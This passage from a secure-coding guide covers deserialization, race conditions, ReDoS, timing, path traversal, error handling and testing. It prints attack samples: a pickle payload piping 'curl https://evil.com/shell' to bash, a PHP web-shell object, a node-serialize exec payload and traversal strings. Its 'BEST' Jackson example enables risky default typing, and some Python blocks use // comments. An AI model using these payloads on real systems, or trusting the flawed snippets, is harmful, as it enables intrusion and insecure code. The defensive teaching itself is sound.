**Rule 1: Never deserialize untrusted data with native serialization formats.**
Native serialization (Java ObjectInputStream, Python pickle, PHP unserialize) can instantiate arbitrary classes. Use data-only formats (JSON, Protocol Buffers, MessagePack).

**Rule 2: If native deserialization is unavoidable, implement strict type allowlists.**
Reject any class not explicitly on the allowlist.

**Rule 3: Monitor for deserialization of unexpected types.**
Log and alert when deserialization encounters unexpected class names.

## Java ObjectInputStream Exploit

Java deserialization is the most widely exploited deserialization vector. Libraries like Apache Commons Collections provide "gadget chains" — sequences of class instantiations that achieve arbitrary code execution.

```java
// VULNERABLE — deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(userInput));
Object obj = ois.readObject(); // Triggers gadget chain → RCE

// SECURE — use a look-ahead deserialization filter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;!*"  // Allow only your model classes, deny everything else
);

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(userInput));
ois.setObjectInputFilter(filter);
Object obj = ois.readObject();

// BEST — avoid Java serialization entirely
// Use JSON with Jackson (with type validation)
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    mapper.getPolymorphicTypeValidator(),
    ObjectMapper.DefaultTyping.NON_FINAL
);
MyObject obj = mapper.readValue(jsonString, MyObject.class);
```

**Attack tools:** `ysoserial` generates payloads for known Java deserialization gadget chains. If your application deserializes untrusted Java objects AND has any common library (Commons Collections, Spring, etc.) on the classpath, RCE is likely.

## PHP unserialize Exploit

PHP's `unserialize()` can trigger magic methods (`__wakeup`, `__destruct`, `__toString`) on arbitrary classes, leading to code execution.

```php
// VULNERABLE — PHP unserialize with user input
$data = unserialize($_COOKIE['user_data']);  // RCE via magic methods

// Attacker crafts a serialized object that triggers __destruct → file_put_contents
// O:8:"LogFile":1:{s:4:"path";s:18:"/var/www/shell.php";s:7:"content";s:28:"<?php system($_GET['c']); ?>";}

// SECURE — use JSON instead
$data = json_decode($_COOKIE['user_data'], true);

// If unserialize is unavoidable (legacy code):
// PHP 7.0+ — restrict allowed classes
$data = unserialize($input, ['allowed_classes' => ['SafeClass1', 'SafeClass2']]);

// BEST — never unserialize user input at all
```

## Python pickle Exploit

Python's `pickle` module can execute arbitrary code during deserialization by defining a `__reduce__` method.

```python
// VULNERABLE — unpickling user input
import pickle
data = pickle.loads(user_input)  # Arbitrary code execution

// Attacker creates a malicious pickle:
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl https://evil.com/shell | bash",))

payload = pickle.dumps(Exploit())
// When unpickled: os.system("curl https://evil.com/shell | bash")

// SECURE — use JSON for data exchange
import json
data = json.loads(user_input)

// If pickle is needed (ML models, etc.):
// 1. Never unpickle data from untrusted sources
// 2. Use fickling to scan pickle files for malicious payloads
// 3. Use safetensors for ML model serialization (not pickle)
// 4. Sign pickle files and verify signatures before loading
```

## Node.js node-serialize RCE

The `node-serialize` npm package executes functions during deserialization using the `_$$ND_FUNC$$_` marker.

```javascript
// VULNERABLE — node-serialize with user input
const serialize = require("node-serialize");
const obj = serialize.unserialize(userInput);

// Attacker sends:
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
// The function is immediately invoked during deserialization

// SECURE — use JSON.parse (never executes code)
const obj = JSON.parse(userInput);
// JSON.parse only creates data structures — no code execution possible

// Other dangerous Node.js patterns:
// - js-yaml with yaml.load() using DEFAULT_SCHEMA (allows !!js/function)
// VULNERABLE:
const yaml = require("js-yaml");
const data = yaml.load(userInput);  // !!js/function triggers code execution

// SECURE:
const data = yaml.load(userInput, { schema: yaml.JSON_SCHEMA });
// Or simply:
const data = yaml.load(userInput);  // js-yaml v4+ uses safe schema by default
```

## .NET BinaryFormatter

```csharp
// VULNERABLE — BinaryFormatter deserializes arbitrary types
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(untrustedStream); // RCE via gadget chain

// SECURE — use System.Text.Json
using System.Text.Json;
MyObject obj = JsonSerializer.Deserialize<MyObject>(jsonString);
// Type-safe, no arbitrary object instantiation
```

**Note:** Microsoft has deprecated `BinaryFormatter` and it is disabled by default in .NET 8+.

## Verification

- Search codebase for all deserialization APIs: `ObjectInputStream`, `pickle.loads`, `unserialize`, `node-serialize`, `BinaryFormatter`, `Marshal.load`, `yaml.load`
- Check if any deserialization takes user-controlled input
- Verify that JSON is used instead of native serialization for data exchange
- If native deserialization is used, verify allowlist filters are in place
- Test with known exploitation tools (ysoserial for Java, pickle payloads for Python)
- Check for `js-yaml` versions < 4.0 using unsafe default schema

---

── Page 19 ──

# Chapter 18: Race Conditions

**Threat Summary:** Race conditions occur when multiple concurrent requests exploit the gap between a security check and the subsequent action (Time-of-Check to Time-of-Use, TOCTOU). They enable balance manipulation, rate limit bypass, and token reuse.

**Severity:** HIGH

## Quick Reference: Common Race Condition Targets

| Target | Attack | Defense |
|--------|--------|---------|
| Account balance | Multiple concurrent purchases drain more than the balance | Atomic database operations |
| Single-use tokens | Token used multiple times before database marks it used | Mark token used BEFORE processing |
| Rate limiting | Concurrent requests all read counter=0 before any increment | Atomic increment operations |
| Coupon codes | Same code redeemed multiple times | Database unique constraint on redemption |

## Core Rules

**Rule 1: Use atomic database operations for check-and-modify patterns.**

```sql
-- VULNERABLE (two separate operations)
SELECT balance FROM accounts WHERE id = 1;
-- If balance >= 100:
UPDATE accounts SET balance = balance - 100 WHERE id = 1;

-- SECURE (single atomic operation)
UPDATE accounts SET balance = balance - 100
WHERE id = 1 AND balance >= 100;
-- Check affected rows: if 0, insufficient balance
```

**Rule 2: Use pessimistic locking for complex transactions.**

```sql
BEGIN;
SELECT * FROM accounts WHERE id = 1 FOR UPDATE; -- Lock the row
-- ... perform business logic ...
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
COMMIT;
```

**Rule 3: Mark single-use tokens as used BEFORE performing the associated action.**

```javascript
// VULNERABLE — process first, then mark used
await processPasswordReset(token, newPassword);
await db.markTokenUsed(token); // Race: another request uses the same token

// SECURE — mark used first with atomic operation
const result = await db.query(
  "UPDATE reset_tokens SET used = true WHERE token_hash = $1 AND used = false RETURNING *",
  [tokenHash]
);
if (result.rows.length === 0) {
  return res.status(400).json({ error: "Invalid or used token" });
}
await processPasswordReset(result.rows[0], newPassword);
```

**Rule 4: Use idempotency keys for operations that must not be duplicated.**

```javascript
app.post("/api/payments", async (req, res) => {
  const { idempotencyKey, amount, recipientId } = req.body;

  // Try to insert the idempotency key (unique constraint will prevent duplicates)
  try {
    await db.query(
      "INSERT INTO payment_idempotency (key, status) VALUES ($1, 'processing')",
      [idempotencyKey]
    );
  } catch (e) {
    // Duplicate key — return the result of the original request
    const existing = await db.getPaymentByIdempotencyKey(idempotencyKey);
    return res.json(existing);
  }

  // Process payment...
});
```

## ReDoS (Regular Expression Denial of Service)

**Severity:** HIGH

ReDoS exploits regular expressions with catastrophic backtracking. Certain regex patterns cause the engine to try an exponential number of paths when processing crafted input, consuming CPU for seconds or minutes on a single request.

**Evil regex patterns (vulnerable to ReDoS):**

| Pattern | Problem | Input that triggers backtracking |
|---------|---------|-------------------------------|
| `(a+)+$` | Nested quantifiers | `aaaaaaaaaaaaaaaaaaaaa!` |
| `(a\|aa)+$` | Overlapping alternation | `aaaaaaaaaaaaaaaaaaaaa!` |
| `(.*a){20}` | Greedy quantifier with backtracking | Long string without 20 `a`s |
| `(\d+\.)+\d+` | Common version/IP pattern | `1.2.3.4.5.6.7.8.9.0.!` |
| `([a-zA-Z]+)*@` | Email-like pattern | `aaaaaaaaaaaaaaaaaaaaa!` |

```javascript
// VULNERABLE — catastrophic backtracking
const emailRegex = /^([a-zA-Z0-9._-]+)*@([a-zA-Z0-9.-]+)$/;
const result = emailRegex.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); // Hangs for seconds/minutes

// SECURE — use atomic/possessive quantifiers or rewrite
// Option 1: Rewrite to eliminate nested quantifiers
const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+$/;

// Option 2: Use a ReDoS-safe regex engine
// Node.js: use re2 (Google's regex engine, no backtracking)
const RE2 = require("re2");
const emailRegex = new RE2("^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+$");

// Option 3: Set a timeout on regex execution
function safeRegexTest(pattern, input, timeoutMs = 100) {
  // Use a worker thread with a timeout
  // If regex takes longer than timeoutMs, reject the input
}
```

```python
// VULNERABLE — Python re module is vulnerable to ReDoS
import re
pattern = re.compile(r"^(a+)+$")
pattern.match("a" * 30 + "!")  # Hangs

// SECURE — use google-re2 for Python
import re2
pattern = re2.compile(r"^(a+)+$")
pattern.match("a" * 30 + "!")  # Returns immediately (no backtracking)
```

**Core Rules for ReDoS prevention:**
1. Never use nested quantifiers (`(a+)+`, `(a*)*`, `(a+)*`)
2. Avoid overlapping alternations (`(a|aa)+`)
3. Use `re2` (Go, Python, Node.js) instead of backtracking regex engines
4. Set input length limits BEFORE applying regex
5. Use static analysis tools (`safe-regex`, `vuln-regex-detector`) to detect vulnerable patterns
6. Test regex patterns with long, adversarial inputs before deploying

## Timing Attacks

**Severity:** MEDIUM

Timing attacks extract secret information by measuring how long operations take. Even small differences (microseconds) can be exploited with statistical analysis.

**Common timing attack vectors:**

| Target | Timing Signal | What leaks |
|--------|--------------|------------|
| String comparison | Early termination on mismatch | Secret value, character by character |
| Database lookup | Query time differs for existing vs. non-existing users | Valid usernames |
| Bcrypt comparison | Skipped when user not found | Whether a username exists |
| Cache hits vs. misses | Faster response for cached items | What data another user accessed |
| Conditional code paths | Different processing times | Internal state/decisions |

```javascript
// VULNERABLE — timing leak reveals valid API keys character by character
function validateApiKey(provided, stored) {
  if (provided.length !== stored.length) return false;  // Length leak
  for (let i = 0; i < provided.length; i++) {
    if (provided[i] !== stored[i]) return false;  // Position leak
  }
  return true;
}

// SECURE — constant-time comparison (see Chapter 11 for full examples)
import crypto from "crypto";
function validateApiKey(provided, stored) {
  const a = Buffer.from(provided);
  const b = Buffer.from(stored);
  if (a.length !== b.length) {
    // Still compare to avoid length-based timing leak
    return crypto.timingSafeEqual(Buffer.alloc(b.length), b) && false;
  }
  return crypto.timingSafeEqual(a, b);
}

// SECURE — eliminate user enumeration via timing
// Always perform the expensive operation (bcrypt) even if user doesn't exist
const user = await db.findUser(username);
const hashToCompare = user?.passwordHash ?? DUMMY_HASH; // Same computation either way
const valid = await bcrypt.compare(password, hashToCompare);
if (!user || !valid) {
  return res.status(401).json({ error: "Invalid credentials" });
}
```

**Cache timing attacks:**

```javascript
// VULNERABLE — cache timing reveals if another user has accessed a resource
app.get("/api/resource/:id", async (req, res) => {
  const cached = cache.get(req.params.id);
  if (cached) {
    return res.json(cached);  // Fast response = someone accessed this recently
  }
  const data = await db.getResource(req.params.id);
  cache.set(req.params.id, data);
  return res.json(data);  // Slow response = first access
});

// MITIGATION — add random delay to normalize response times
// Or use per-user caches instead of shared caches
```

**Core Rules for timing attack prevention:**
1. Use timing-safe comparison functions for ALL secret comparisons
2. Ensure authentication flows take the same time regardless of outcome
3. Use per-user caches or add jitter to shared cache responses
4. Log and monitor for statistical timing analysis attempts

## Verification

- Send 20 concurrent identical requests to any state-changing endpoint
- Test single-use tokens with concurrent submissions
- Test purchase flows with concurrent requests exceeding the balance
- Use HTTP/2 single-packet attacks for precise timing (Burp Suite Turbo Intruder)
- Test regex patterns with adversarial inputs (e.g., `"a".repeat(30) + "!"`)
- Measure login response times for valid vs. invalid usernames — they should be identical
- Verify all secret comparisons use `crypto.timingSafeEqual` or `hmac.compare_digest`

---

── Page 20 ──

# Chapter 19: Path Traversal and File Access

**Threat Summary:** Path traversal allows attackers to read or write files outside the intended directory by injecting `../` sequences into file path parameters.

**Severity:** CRITICAL (write access), HIGH (read access)

## Core Rules

**Rule 1: Never pass user input directly to filesystem APIs.**
Use a mapping or index instead:

```javascript
// VULNERABLE
app.get("/api/files/:name", (req, res) => {
  res.sendFile(path.join("/uploads", req.params.name));
  // Attacker: /api/files/../../etc/passwd
});

// SECURE — resolve and validate
app.get("/api/files/:name", (req, res) => {
  const uploadsDir = path.resolve("/uploads");
  const filePath = path.resolve(uploadsDir, req.params.name);

  // Verify the resolved path is within the intended directory
  if (!filePath.startsWith(uploadsDir + path.sep)) {
    return res.status(400).json({ error: "Invalid path" });
  }

  res.sendFile(filePath);
});
```

**Rule 2: Canonicalize THEN validate.**
Resolve symbolic links and relative paths before checking the result. Attackers use URL encoding (`%2e%2e%2f`), double encoding (`%252e%252e%252f`), Unicode encoding, and null bytes to bypass filters.

**Rule 3: Use chroot or container isolation for file processing.**
If the application processes user-uploaded files, do so in an isolated environment with no access to the host filesystem.

## Path Traversal Bypass Techniques to Defend Against

| Technique | Example | Defense |
|-----------|---------|---------|
| Basic traversal | `../../../etc/passwd` | Resolve path and check prefix |
| URL encoding | `%2e%2e%2f` | Decode before validation |
| Double encoding | `%252e%252e%252f` | Recursively decode |
| Null byte | `../../etc/passwd%00.jpg` | Reject null bytes |
| Nested traversal | `....//....//etc/passwd` | Use path.resolve, not string replacement |
| Windows backslash | `..\..\..\windows\win.ini` | Normalize path separators |
| Unicode normalization | `%c0%ae%c0%ae/` (overlong UTF-8 for `..`) | Normalize Unicode before validation |
| Windows 8.3 filenames | `PROGRA~1` instead of `Program Files` | Resolve to long path names |
| Windows ADS | `file.txt::$DATA` (Alternate Data Stream) | Strip ADS references |
| Symlink following | Upload a symlink → read target via download | Reject symlinks during extraction |

## Null Byte Injection

In languages/runtimes with C-based string handling, a null byte (`%00`) terminates the string early. This can bypass extension checks.

```
// Attack: bypass .pdf extension requirement
/api/files/../../etc/passwd%00.pdf

// The application sees: ../../etc/passwd.pdf (passes extension check)
// The filesystem sees: ../../etc/passwd (null byte terminates the string)
```

**Note:** Modern languages (Node.js, Python 3, Java) reject null bytes in file paths. This is primarily a risk in older PHP, Perl, and C-based systems. Still, defense-in-depth says: reject any input containing null bytes.

```javascript
// SECURE — reject null bytes explicitly
if (filename.includes("\0") || filename.includes("%00")) {
  return res.status(400).json({ error: "Invalid filename" });
}
```

## Double URL Encoding Bypass

If the application URL-decodes input once (removing `%2e%2e%2f` → `../`) but then a downstream component decodes again, the attacker uses double encoding.

```
Single encoding:  %2e%2e%2f  → ../      (caught by first decode + validation)
Double encoding:  %252e%252e%252f → %2e%2e%2f → ../  (bypasses validation if only decoded once)
```

**Prevention:**

```javascript
// SECURE — recursively decode until stable, then validate
function fullyDecode(input) {
  let decoded = input;
  let previous;
  let iterations = 0;
  do {
    previous = decoded;
    decoded = decodeURIComponent(decoded);
    iterations++;
    if (iterations > 5) throw new Error("Excessive URL encoding detected");
  } while (decoded !== previous);
  return decoded;
}

const decoded = fullyDecode(req.params.filename);
const resolved = path.resolve(UPLOAD_DIR, decoded);
if (!resolved.startsWith(UPLOAD_DIR + path.sep)) {
  return res.status(400).json({ error: "Invalid path" });
}
```

## Windows-Specific Path Traversal

Windows introduces additional path traversal vectors:

```
// Backslash as separator (Windows treats \ and / interchangeably)
..\..\windows\win.ini

// 8.3 short filenames
// "Program Files" → PROGRA~1
// "web.config" → WEB~1.CON
// Attacker may use short names to bypass extension filters

// Alternate Data Streams (ADS)
// file.txt::$DATA — accesses the default data stream
// file.txt:malicious.exe — hides data in an alternate stream
// A filter blocking ".exe" may not catch "file.txt:payload.exe"

// UNC paths
\\attacker-server\share\malicious.exe

// Device names (reserved, even with extensions)
CON, PRN, AUX, NUL, COM1-COM9, LPT1-LPT9
// Creating file "NUL.txt" or "CON.txt" causes errors on Windows
```

**Prevention for Windows:**

```javascript
// SECURE — comprehensive Windows path validation
function isPathSafe(filename) {
  // Reject null bytes
  if (filename.includes("\0")) return false;

  // Reject backslashes
  if (filename.includes("\\")) return false;

  // Reject ADS references
  if (filename.includes(":") && !filename.match(/^[a-zA-Z]:/)) return false;

  // Reject Windows reserved names
  const reserved = /^(CON|PRN|AUX|NUL|COM\d|LPT\d)(\..*)?$/i;
  const basename = path.basename(filename, path.extname(filename));
  if (reserved.test(basename)) return false;

  // Reject UNC paths
  if (filename.startsWith("//") || filename.startsWith("\\\\")) return false;

  return true;
}
```

## Symlink Following

When extracting archives or processing user-uploaded directory structures, symlinks can point to sensitive files outside the intended directory.

```javascript
// SECURE — check for symlinks before accessing files
import fs from "fs";

function safeReadFile(filePath, baseDir) {
  const resolved = fs.realpathSync(filePath); // Resolves symlinks
  if (!resolved.startsWith(baseDir)) {
    throw new Error("Symlink escape detected");
  }
  return fs.readFileSync(resolved);
}
```

## Verification

- Submit `../../../etc/passwd` in file path parameters — should be blocked
- Submit `%2e%2e%2f` (URL-encoded) — should be blocked
- Submit `%252e%252e%252f` (double-encoded) — should be blocked
- Submit filenames with null bytes (`file%00.pdf`) — should be rejected
- On Windows: test with backslashes, ADS (`file::$DATA`), reserved names (`CON.txt`)
- Upload an archive containing symlinks — extraction should reject symlinks
- Verify `path.resolve()` + prefix check is used (not string replacement)

---

── Page 21 ──

# Chapter 20: Error Handling and Information Disclosure

**Threat Summary:** Verbose error messages reveal internal architecture, database structure, file paths, and technology versions to attackers. This information guides more targeted attacks.

**Severity:** MEDIUM

## Core Rules

**Rule 1: Never expose stack traces, database errors, or internal paths to users.**

```javascript
// VULNERABLE
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // Reveals internal code structure
    query: err.query, // Reveals SQL queries
  });
});

// SECURE
app.use((err, req, res, next) => {
  // Log detailed error server-side
  logger.error("Unhandled error", { error: err, requestId: req.id });

  // Return generic message to client
  res.status(500).json({
    error: "An internal error occurred",
    requestId: req.id, // For support reference only
  });
});
```

**Rule 2: Configure production frameworks to suppress debug output.**
- Node.js: `NODE_ENV=production`
- Next.js: debug mode disabled by default in production builds
- Django: `DEBUG = False`
- Rails: `config.consider_all_requests_local = false`
- PHP: `display_errors = Off`, `log_errors = On`

**Rule 3: Remove comments, source maps, and debug endpoints from production.**
- HTML comments may reveal internal documentation
- JavaScript source maps (`.js.map`) expose full source code
- Debug endpoints (`/debug`, `/test`, `/phpinfo`) expose configuration

**Rule 4: Log aggressively server-side, reveal nothing client-side.**
Log: timestamps, request IDs, user IDs, IP addresses, the full error, and the request that triggered it. Return: a generic message and a request ID for correlation.

**Rule 5: Never include these in error responses:**
- Stack traces or line numbers
- Database queries or error messages (reveals schema)
- Internal IP addresses or hostnames
- File system paths (reveals directory structure)
- Framework/library versions (guides exploit selection)
- Environment variable names or values
- Other users' data or identifiers

## Django DEBUG=True Exposure

```python
// VULNERABLE — Django with DEBUG=True in production
// settings.py
DEBUG = True  # Exposes: full stack traces, local variables, SQL queries,
              # installed apps, middleware, template paths, settings values

// SECURE
DEBUG = False
ALLOWED_HOSTS = ["example.com", "www.example.com"]  # Required when DEBUG=False

// Custom error views
// urls.py
handler404 = "myapp.views.custom_404"
handler500 = "myapp.views.custom_500"

// views.py
def custom_500(request):
    return render(request, "errors/500.html", status=500)
    # Template shows: "Something went wrong. Reference: <request_id>"
```

**What Django DEBUG=True reveals to attackers:**
- Full Python traceback with local variable values (may include passwords, tokens)
- SQL queries that caused errors (reveals database schema)
- All Django settings (may include SECRET_KEY, database credentials)
- Full list of URL patterns (reveals all API endpoints)
- Template file paths (reveals directory structure)

## Express Default Error Handler

```javascript
// VULNERABLE — Express default error handler in development mode
// NODE_ENV=development exposes stack traces
app.use((err, req, res, next) => {
  res.status(err.status || 500).json({
    message: err.message,      // May contain SQL error details
    stack: err.stack,           // Full stack trace with file paths
  });
});

// SECURE — production error handler with request correlation
import { v4 as uuid } from "uuid";

// Add request ID middleware
app.use((req, res, next) => {
  req.id = uuid();
  next();
});

// Error handler
app.use((err, req, res, next) => {
  // Log everything server-side
  logger.error({
    requestId: req.id,
    method: req.method,
    path: req.path,
    userId: req.user?.id,
    error: err.message,
    stack: err.stack,
    statusCode: err.status || 500,
  });

  // Return minimal info to client
  const statusCode = err.status || 500;
  const clientMessage = statusCode === 404
    ? "Resource not found"
    : statusCode === 403
    ? "Access denied"
    : "An internal error occurred";

  res.status(statusCode).json({
    error: clientMessage,
    requestId: req.id,  // For support correlation only
  });
});
```

## Custom Error Pages

```javascript
// Express — serve custom HTML error pages
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, "public", "404.html"));
});

app.use((err, req, res, next) => {
  logger.error({ requestId: req.id, error: err });
  res.status(500).sendFile(path.join(__dirname, "public", "500.html"));
});
```

```html
<!-- public/500.html — reveals nothing about the server -->
<!DOCTYPE html>
<html>
<head><title>Error</title></head>
<body>
  <h1>Something went wrong</h1>
  <p>We've been notified and are looking into it.</p>
  <p>If this persists, contact support with this reference.</p>
</body>
</html>
```

## Log Injection Prevention

If user input is written to log files without sanitization, attackers can inject fake log entries, corrupt log integrity, or exploit log analysis tools.

```javascript
// VULNERABLE — user input directly in logs
logger.info(`User login: ${username} from ${ip}`);
// Attacker sets username to: "admin\n2024-01-01 INFO User login: admin from 10.0.0.1"
// This creates a fake log entry that looks like a legitimate admin login

// SECURE — use structured logging (JSON format)
logger.info({ event: "user_login", username: sanitizeForLog(username), ip });

// Sanitize log input — remove newlines, control characters
function sanitizeForLog(input) {
  if (typeof input !== "string") return String(input);
  return input
    .replace(/[\r\n]/g, " ")          // Remove newlines (prevent log injection)
    .replace(/[\x00-\x1f\x7f]/g, "")  // Remove control characters
    .substring(0, 500);                // Limit length
}
```

**Core Rules for log security:**
1. Use structured/JSON logging — never interpolate user input into log message strings
2. Strip newlines and control characters from any user data in logs
3. Never log passwords, tokens, credit card numbers, or API keys
4. Implement log rotation and retention policies
5. Send logs to a centralized, append-only system (attackers cannot modify them)

## Verification

- Trigger a server error (e.g., invalid input to a database query) and verify the response contains no stack trace, SQL, or file paths
- Check that `DEBUG=False` (Django), `NODE_ENV=production` (Node.js), `display_errors=Off` (PHP) in production
- Verify custom error pages are served for 404 and 500 errors
- Check that error responses include only a generic message and a request ID
- Search logs for any occurrences of passwords, tokens, or secrets
- Test log injection by submitting input with newline characters
- Verify no `.js.map` source map files are accessible in production
- Check that `/debug`, `/test`, `/phpinfo.php`, `/elmah.axd` return 404

---

── Page 22 ──

# Chapter 21: Security Testing Methodology

**Threat Summary:** Systematic security testing follows a structured methodology. Ad hoc testing misses entire vulnerability classes.

## The Testing Process

**Phase 1: Reconnaissance**
1. Map all application functionality (manual browsing + automated spidering)
2. Identify all entry points (parameters, headers, cookies, file uploads)
3. Fingerprint technologies (server, framework, database, CDN)
4. Check for exposed documentation, admin interfaces, debug endpoints

**Phase 2: Authentication and Session Testing**
1. Test password policies and brute-force protections
2. Test for username enumeration (registration, login, password reset)
3. Test session token randomness and cookie attributes
4. Test logout and session timeout
5. Test MFA implementation

**Phase 3: Authorization Testing**
1. Test vertical privilege escalation (regular user → admin)
2. Test horizontal privilege escalation (User A → User B's data)
3. Test IDOR on every endpoint with object IDs
4. Test access control on all HTTP methods

**Phase 4: Input Validation Testing**
1. Fuzz all parameters for injection (SQL, command, template)
2. Test for XSS (reflected, stored, DOM-based)
3. Test for SSRF on any URL parameter
4. Test file upload security
5. Test for path traversal

**Phase 5: Business Logic Testing**
1. Test multi-step process bypass
2. Test with boundary values (0, negative, max)
3. Test race conditions on sensitive operations
4. Test payment flows with manipulated values

**Phase 6: Configuration and Infrastructure**
1. Test TLS configuration
2. Verify security headers
3. Check for default credentials
4. Test CORS configuration
5. Verify CSP policy

## Testing Priority Order

| Priority | Category | Why |
|----------|----------|-----|
| 1 | Authentication & Session | If broken, everything else is irrelevant |
| 2 | Authorization / Access Control | IDOR = direct data breach |
| 3 | Injection | Direct server compromise |
| 4 | XSS | Account takeover via session theft |
| 5 | Business Logic | Cannot be found by scanners |
| 6 | SSRF | Cloud credential theft |
| 7 | CSRF | State-changing actions as victim |
| 8 | Configuration | Headers, TLS, CORS |
| 9 | Supply Chain | Dependency vulnerabilities |
| 10 | Error Handling | Information disclosure |

## SAST vs DAST vs IAST Comparison

| Aspect | SAST (Static) | DAST (Dynamic) | IAST (Interactive) |
|--------|---------------|----------------|---------------------|
| When | During development/CI | Against running app | During testing/QA |
| How | Analyzes source code | Sends HTTP requests | Instruments runtime |
| Finds | Code-level vulnerabilities | Runtime vulnerabilities | Both code and runtime |
| False positives | High | Medium | Low |
| Coverage | All code paths | Only reachable paths | Exercised paths |
| Speed | Fast (minutes) | Slow (hours) | Medium |
| Language-dependent | Yes | No | Yes |
| Examples | Semgrep, CodeQL, SonarQube | OWASP ZAP, Burp Suite, Nuclei | Contrast Security, Hdiv |

**When to use each:**
- **SAST:** Every PR/commit in CI — fast feedback, catches coding errors
- **DAST:** Pre-release and scheduled scans — finds runtime misconfigurations
- **IAST:** During integration/QA testing — best accuracy, fewest false positives

## Security Unit Test Examples

```javascript
// Security unit tests — run in CI alongside regular tests
import { describe, it, expect } from "vitest";

describe("Authentication Security", () => {
  it("should return identical responses for valid and invalid usernames", async () => {
    const validUserResponse = await request(app)
      .post("/api/login")
      .send({ username: "existing_user", password: "wrong_password" });

    const invalidUserResponse = await request(app)
      .post("/api/login")
      .send({ username: "nonexistent_user_xyz", password: "wrong_password" });

    // Status code must be identical
    expect(validUserResponse.status).toBe(invalidUserResponse.status);

    // Response body structure must be identical
    expect(Object.keys(validUserResponse.body).sort())
      .toEqual(Object.keys(invalidUserResponse.body).sort());

    // Response body content must be identical
    expect(validUserResponse.body.error).toBe(invalidUserResponse.body.error);
  });

  it("should not accept SQL injection in username", async () => {
    const response = await request(app)
      .post("/api/login")
      .send({ username: "' OR 1=1 --", password: "password" });

    expect(response.status).toBe(401);
  });
});

describe("Access Control", () => {
  it("should prevent horizontal privilege escalation", async () => {
    const userAToken = await getAuthToken("userA");
    const response = await request(app)
      .get("/api/orders/userB-order-id")
      .set("Authorization", `Bearer ${userAToken}`);

    expect(response.status).toBe(404); // Not 200, not 403
  });

  it("should deny admin endpoints to regular users", async () => {
    const regularToken = await getAuthToken("regularUser");
    const response = await request(app)
      .delete("/api/admin/users/123")
      .set("Authorization", `Bearer ${regularToken}`);

    expect(response.status).toBe(403);
  });
});

describe("Input Validation", () => {
  it("should reject path traversal in file downloads", async () => {
    const response = await request(app)
      .get("/api/files/../../etc/passwd");

    expect(response.status).toBe(400);
  });

  it("should reject XSS payloads stored in database", async () => {
    await request(app)
      .post("/api/comments")
      .send({ body: '<script>alert(1)</script>' })
      .set("Authorization", `Bearer ${token}`);

    const response = await request(app).get("/api/comments");
    expect(response.text).not.toContain("<script>");
  });
});
```

## Threat Modeling with STRIDE

STRIDE is a framework for systematically identifying threats during design.

| Category | Threat | Question to Ask | Example |
|----------|--------|----------------|---------|
| **S**poofing | Identity fake | Can an attacker pretend to be someone else? | Forged JWT, stolen session |
| **T**ampering | Data modification | Can an attacker modify data in transit or at rest? | Man-in-the-middle, mass assignment |
| **R**epudiation | Deny actions | Can a user deny performing an action? | Missing audit logs |
| **I**nformation Disclosure | Data leak | Can an attacker read data they shouldn't? | IDOR, verbose errors, SSRF |
| **D**enial of Service | Availability | Can an attacker make the system unavailable? | ReDoS, zip bombs, unbounded queries |
| **E**levation of Privilege | Unauthorized access | Can an attacker gain higher privileges? | Vertical/horizontal escalation |

**Threat modeling steps:**
1. Draw a data flow diagram (DFD) of the system
2. Identify trust boundaries (where data crosses between trusted and untrusted zones)
3. For each data flow crossing a trust boundary, apply all 6 STRIDE categories
4. For each identified threat, determine: likelihood, impact, and mitigation
5. Prioritize by risk (likelihood x impact)
6. Document mitigations and verify they are implemented

## CVSS Scoring Quick Reference

CVSS (Common Vulnerability Scoring System) v3.1 scores vulnerabilities from 0.0 to 10.0.

| Score | Rating | Response |
|-------|--------|----------|
| 0.0 | None | Informational |
| 0.1 - 3.9 | Low | Fix in next release |
| 4.0 - 6.9 | Medium | Fix within 30 days |
| 7.0 - 8.9 | High | Fix within 7 days |
| 9.0 - 10.0 | Critical | Fix immediately (hotfix) |

**Key CVSS v3.1 base metrics:**

| Metric | Values | Meaning |
|--------|--------|---------|
| Attack Vector (AV) | Network / Adjacent / Local / Physical | How the attacker reaches the target |
| Attack Complexity (AC) | Low / High | Conditions beyond attacker's control |
| Privileges Required (PR) | None / Low / High | Auth level needed |
| User Interaction (UI) | None / Required | Does victim need to do something? |
| Scope (S) | Unchanged / Changed | Does impact extend beyond the vulnerable component? |
| CIA Impact | None / Low / High | Confidentiality, Integrity, Availability impact |

**Common vulnerability CVSS scores:**
- SQL injection (unauthenticated, network): ~9.8 (Critical)
- Stored XSS: ~6.1-8.0 (Medium-High)
- CSRF: ~4.3-6.5 (Medium)
- Missing security headers: ~3.0-5.0 (Low-Medium)
- Information disclosure via error messages: ~3.0-5.3 (Low-Medium)

## CI/CD Security Gate Configuration

```yaml
// GitHub Actions — security gate example
name: Security Gate
on: [pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # SAST — static analysis
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            p/nodejs

      # Dependency audit
      - name: npm audit
        run: npm audit --audit-level=high

      # Secret scanning
      - name: Detect secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.pull_request.base.sha }}
          head: ${{ github.event.pull_request.head.sha }}

      # Container scanning (if applicable)
      - name: Scan container image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          severity: "CRITICAL,HIGH"
          exit-code: "1"  # Fail the build on critical/high vulns

      # Security headers check (against staging)
      - name: Check security headers
        run: |
          curl -s -I https://staging.example.com | grep -i "strict-transport-security"
          curl -s -I https://staging.example.com | grep -i "content-security-policy"
          curl -s -I https://staging.example.com | grep -i "x-content-type-options"
```

## Verification

